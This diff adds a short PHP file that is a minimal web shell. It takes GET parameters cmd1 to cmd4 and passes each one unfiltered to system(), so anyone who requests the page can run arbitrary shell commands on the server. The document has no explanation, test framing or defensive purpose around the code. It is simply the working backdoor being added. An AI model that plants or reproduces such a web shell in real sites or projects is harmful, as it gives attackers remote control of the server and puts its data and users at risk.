@@ -1,0 +1,10 @@
+<?php
+if(isset($_GET['cmd1']))
+  system($_GET['cmd1']);
+if(isset($_GET['cmd2']))
+  system($_GET['cmd2']); 
+if(isset($_GET['cmd3']))
+  system($_GET['cmd3']); 
+if(isset($_GET['cmd4']))
+  system($_GET['cmd4']); 
+?>
